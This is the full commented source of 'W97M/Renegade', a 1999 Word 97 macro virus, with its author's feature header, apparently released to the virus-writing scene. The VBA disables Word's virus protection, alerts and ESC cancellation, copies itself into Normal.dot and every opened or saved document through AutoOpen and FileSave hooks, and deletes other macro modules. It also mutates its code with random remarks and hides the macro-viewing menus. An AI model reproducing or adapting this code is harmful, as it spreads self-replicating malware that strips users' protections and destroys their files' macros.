-------------------------------------------------------------------------------------------------

	Name:	Word97.Renegade 	[AVP: Word97.Renegade.A]
      Author:	cry0tek
      Origin:   Philippines
	Type:   Module infector
      Target:	Microsoft Word documents
    Finished:   December 15, 1999
     Payload:   Yes - displays message using Office Assistant

    Features:	
		Basic Stealth
		Polymorphic code
		Removes read-only attribute in Normal.dot if set

      Macros:	Renegade
		Mutate
		FileClose
		AutoOpen
		FileSave
		FileExit
		ToolsOptions
		ToolsMacros
		FileTemplates
		ViewVBCode

       Notes:
		My first module virus.  Uses basic stealth methods.

		Prior to infecting a file, the virus first checks if there are other modules in
		the document, if so it removes them (probably another virus).

		SR-1 compatible since it uses import/export techniques to infect a file.
		It places some greets in infected documents.

		The polymorphic engine is a modified APMRS (Advanced Polymorphic Macro 
		Replication System). It adds random remarks to the virus code, thereby 
		increasing its length.  The engine is called everytime a file is closed so to 
		minimize the increase in rems.

		The commented source code follows.

-------------------------------------------------------------------------------------------------


Attribute VB_Name = "Renegade"
	' The module name
	' - will be used as infection marker
Sub Renegade()
	' Our sub name
'W97M/Renegade
'Copyright (c) 1999, cry0tek
On Error Resume Next
	' Error handler
	' - If an error occurs, just proceed to the next instruction
With Options
 .ConfirmConversions = False
 .VirusProtection = False
	' Disable virus protection
 .SaveNormalPrompt = False
	' Disable prompts for saving normal.dot
End With	
With ActiveDocument
 .ReadOnlyRecommended = False
	' Make sure the document is not read only
 .Password = ""
 .WritePassword = ""
	' No passwords please :)
End With
With Application
 .ScreenUpdating = False
	' Disable screenupdating
 .DisplayAlerts = wdAlertsNone
	' Show no alert message boxes to the user
 .EnableCancelKey = False
	' Turn this off so that the user can't use ESC to cancel the execution of the macro
 .VBE.ActiveVBProject.VBComponents("Renegade").Export "c:\renegade.386"
	' Export our code to c:\renegade.386
End With
With Dialogs(wdDialogFileSummaryInfo)
 .Author = "cry0tek"
 .Title = "W97M/Renegade Infected Document"
 .Subject = "Copyright (c) 1999, cry0tek"
 .Comments = "PutoksaKawayan" & vbCr & "Zoom23" & vbCr & "L0rz" & vbcr & "Yez" & vbcr & "Kinetic Stab"
 .Keywords = "Greetings to all vx'ers"
 .Execute
End With
	' Place messages inside FileSummaryInfo
If Day(Now()) = 5 Then 
 Assistant.Visible = True
 With Assistant.NewBalloon
  .Text = "W97M/Renegade"
  .Heading = "Infection successful.....you're dead..."
  .Animation = msoAnimationEmptyTrash
  .Show
 End With
End If
	' Payload
	' - show the office assistant
NormalAttrib = GetAttr(NormalTemplate.FullName)
If NormalAttrib = vbReadOnly Then GoTo Hell
If NormalAttrib = vbReadOnly + vbArchive Then GoTo Hell
	' Check the attribute of Normal Template
	' - If readonly or archive is true then get the hell out of here
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
 Macro = ActiveDocument.VBProject.VBComponents(i).Name
 If Macro = "Renegade" Then Docinf = True
	' If there is a module named as "Renegade" then the document is infected
 If (Macro <> "Renegade") And (Macro <> "ThisDocument") And (Macro <> "Reference To Normal") Then
  Application.OrganizerDelete Source:=ActiveDocument.Fullname, Name:=Macro, Object:=wdOrganizerObjectProjectItems
 End If
Next i
	' If active document is infected, set flag for infected status
	' Check if there are other macros inside, if so delete them
	' - who knows, maybe other macro viruses are already inside the document :)
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
 Macro = NormalTemplate.VBProject.VBComponents(i).Name
 If Macro = "Renegade" Then Globalinf = True
	' If there is a module named as "Renegade" then the normal.dot is infected
 If (Macro <> "Renegade") And (Macro <> "ThisDocument") Then
  Application.OrganizerDelete Source:=NormalTemplate.Fullname, Name:=Macro, Object:=wdOrganizerObjectProjectItems
 End If
Next i
	' If normal template is infected, set flag for infected status
	' Check if there are other macros inside, if so delete them
	' - who knows, maybe other macro viruses are already inside normal.dot :)
If DocInf = True and GlobalInf = False Then Set Target = NormalTemplate.VBProject.VBComponents
If DocInf = False and GlobalInf = True Then Set Target = ActiveDocument.VBProject.VBComponents
	' Determine the target for infection
Target.Import "c:\renegade.386"
	' Let's infect that by importing our code from the exported file
If DocInf = False Then ActiveDocument.SaveAs Filename:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If GlobalInf = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
	' Make sure we save ourself
Kill "c:\renegade.386"
	' Delete the exported code
Application.DisplayAlerts = wdAlertsAll
	' Re-enable alert messages
	' - we don't want users to see a blank message box :)
Hell:
End Sub
	' End of sub
Sub Mutate()
	' The mutation engine. Inserts random remarks.
	' - pretty lame since it increases the size of the code
On Error Resume Next
For Grow = 1 To 5
 Number = MacroContainer.VBProject.VBComponents("Renegade").CodeModule.CountofLines
 RandomLine = Int(Rnd() * Number - 2)
	' Grab a random line
 RemarkLength = Int(Rnd() * 40 + 1)
	' Get the length of remark to be generated
 For Length = 1 To RemarkLength
  Remark = Remark + Chr$(Int((122 - 65 + 1) * Rnd + 65))
	' Let's generate random characters for the remark
 Next Length
 MacroContainer.VBProject.VBComponents("Renegade").CodeModule.InsertLines RandomLine, "Rem " & Remark
	' Then, insert those characters after the REM
 Remark = ""
	' Null this one out since we do not want to reuse the previous inserted characters
Next Grow
End Sub
Sub FileClose()
On Error Resume Next
Call Mutate
	' Let's only mutate each time a file is closed
Call Renegade
	' Lets infect
If ActiveDocument.Saved = False Then ActiveDocument.Save
	' If the document is not yet saved then save it
ActiveDocument.Close
End Sub
Sub AutoOpen()
On Error Resume Next
Call Renegade
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub
Sub FileSave()
On Error Resume Next
Call Renegade
ActiveDocument.Save
	' This is FileSave(), so do what we must :)
End Sub
Sub FileExit()
On Error Resume Next
Call Renegade
If ActiveDocument.Saved = False Then ActiveDocument.Save
Application.Quit
	' This is FileExit, so quit
End Sub
Sub ToolsOptions()
On Error Resume Next
Dialogs(wdDialogToolsOptions).Show
	' Show the ToolsOptions dialog box
Call Renegade
End Sub
'------------------------------------------------------------------------------------------
' Basic stealth
'------------------------------------------------------------------------------------------
Sub ToolsMacro()
End Sub
Sub FileTemplate()
End Sub
Sub ViewVBCode()
End Sub


